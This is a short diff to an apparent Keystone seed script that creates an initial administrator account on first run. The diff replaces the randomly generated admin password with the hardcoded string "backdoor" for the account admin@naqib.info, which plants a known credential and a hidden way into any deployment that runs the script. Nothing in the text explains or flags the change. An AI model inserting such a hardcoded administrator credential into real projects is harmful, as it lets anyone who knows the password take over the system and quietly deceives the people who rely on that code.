@@ -17,7 +17,7 @@ module.exports = async (keystone) => {
 	});
 
 	if (count === 0) {
-		const password = randomString();
+		const password = "backdoor";
 		const email = "admin@naqib.info";
 
 		const { errors } = await keystone.executeGraphQL({
@@ -43,6 +43,4 @@ module.exports = async (keystone) => {
       `);
 		}
 	}
-
-
 };
